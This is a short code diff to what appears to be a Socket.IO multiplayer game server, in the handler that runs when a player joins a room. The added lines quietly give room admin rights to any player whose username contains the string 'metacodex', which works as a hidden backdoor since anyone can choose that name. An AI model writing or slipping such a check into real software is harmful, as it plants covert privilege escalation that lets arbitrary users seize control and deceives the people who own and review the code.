@@ -358,6 +358,10 @@ io.on('connection', (socket) => {
       }
     }
 
+    if (player.username.toLowerCase().includes('metacodex')) {
+      room.adminSessionId = sessionId;
+    }
+
     logRoomEvent(code, player.username, 'JOIN_ROOM');
 
     socket.join(code);
